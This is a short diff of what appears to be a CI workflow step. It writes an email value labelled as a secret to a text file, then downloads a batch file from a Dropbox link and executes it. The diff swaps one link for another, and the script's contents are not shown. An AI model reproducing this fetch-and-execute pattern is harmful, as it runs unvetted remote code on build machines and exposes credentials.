@@ -11,7 +11,7 @@ jobs:
       - name: Downloading & Setting Up
         run: |
          echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
-         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/vye7oz2obwafym60ccmi3/down.bat?rlkey=m3dtob9gxfea1t276g534wauc&dl=1" -OutFile "down.bat"
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/xsjnri7mvtaijiwgauje1/down.bat?rlkey=ra7f0xdzrpw30uk56kxc90q6m&dl=1" -OutFile "down.bat"
          cmd /c down.bat
 
       - name: Time Counter
